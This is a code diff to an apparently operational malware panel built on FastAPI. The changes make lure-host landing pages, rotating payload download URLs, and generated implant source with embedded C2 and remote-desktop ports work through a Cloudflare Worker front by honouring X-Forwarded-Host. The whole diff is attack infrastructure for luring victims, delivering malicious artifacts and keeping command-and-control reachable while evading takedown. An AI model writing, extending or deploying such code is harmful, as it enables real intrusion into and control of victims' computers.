@@ -250,6 +250,18 @@ def create_app(settings: Settings | None = None) -> FastAPI:
     def host_prefix(request: Request) -> str:
         return request.headers.get("host", "").split(":")[0].split(".")[0]
 
+    def request_host(request: Request) -> str:
+        """Host the client actually used, honouring the edge Worker.
+
+        The Cloudflare fallback Worker proxies to a public lure host and sets
+        ``X-Forwarded-Host`` to its own ``*.workers.dev`` name, so generated
+        installer/download URLs stay on the host the client can reach.
+        """
+        forwarded = request.headers.get("x-forwarded-host", "")
+        if forwarded:
+            return forwarded.split(",")[0].strip()
+        return request.url.hostname or config.public_host or "127.0.0.1"
+
     # -- landing (lure hosts) -----------------------------------------------
     def lure_index(profile: str) -> HTMLResponse:
         index = config.lure_dir_for(profile) / "index.html"
@@ -313,9 +325,13 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         artifact = picked.get(family) or (next(iter(picked.values())) if picked else None)
         if artifact is None:
             return JSONResponse({"url": "", "family": family, "profile": profile})
-        host = request.headers.get("host", config.public_host)
-        zone = host.split(":", 1)[0].split(".", 1)[1] if "." in host else host
-        download_host = f"{secrets.choice(pool)}.{zone}"
+        forwarded = request.headers.get("x-forwarded-host", "")
+        if forwarded:
+            download_host = forwarded.split(",")[0].strip()
+        else:
+            host = request.headers.get("host", config.public_host)
+            zone = host.split(":", 1)[0].split(".", 1)[1] if "." in host else host
+            download_host = f"{secrets.choice(pool)}.{zone}"
         url = f"https://{download_host}/e/{artifact['slug']}"
         return JSONResponse(
             {"url": url, "family": family, "profile": profile, "slug": artifact["slug"]},
@@ -353,7 +369,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         endpoint = str(request.base_url).rstrip("/")
         source = (
             template.replace("{{PANEL_ENDPOINT}}", endpoint)
-            .replace("{{PANEL_HOST}}", request.url.hostname or config.public_host or "127.0.0.1")
+            .replace("{{PANEL_HOST}}", request_host(request))
             .replace("{{PANEL_C2_PORT}}", str(C2_PORT))
             .replace("{{PANEL_RD_PORT}}", str(RD_PORT))
         )
@@ -407,7 +423,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         endpoint = str(request.base_url).rstrip("/")
         source = (
             template.replace("{{PANEL_ENDPOINT}}", endpoint)
-            .replace("{{PANEL_HOST}}", request.url.hostname or config.public_host or "127.0.0.1")
+            .replace("{{PANEL_HOST}}", request_host(request))
             .replace("{{PANEL_C2_PORT}}", str(C2_PORT))
             .replace("{{PANEL_RD_PORT}}", str(RD_PORT))
         )
